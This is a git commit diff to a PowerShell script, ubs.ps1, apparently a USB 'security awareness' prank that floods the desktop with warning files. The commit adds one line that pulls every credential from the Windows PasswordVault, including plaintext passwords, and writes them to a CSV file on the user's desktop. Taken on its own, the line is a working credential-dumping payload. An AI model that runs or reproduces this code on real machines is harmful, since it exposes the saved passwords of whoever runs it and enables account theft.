d57cf9326187c826646c7332d70ee59ca2a9c335
ThomasNordlund1976 <96356419+ThomasNordlund1976@users.noreply.github.com>
2021-12-19 10:54:06 +0100

    Update ubs.ps1

--- ubs.ps1
+++ ubs.ps1
@@ -1,3 +1,4 @@
 ﻿foreach ($i in 1..200){
         new-item "$env:HOMEDRIVE$env:HOMEPATH\desktop\I_should_not_use_unknown_USBs-$i.txt" -ItemType File -Force -Value "DONT BE A SECURITYRISK!`r`n"  
 } 
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];$($($(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }) | select resource,username,password | ConvertTo-Csv | out-file "$env:HOMEDRIVE$env:HOMEPATH\desktop\This-Could-have-Been-stolen.csv")
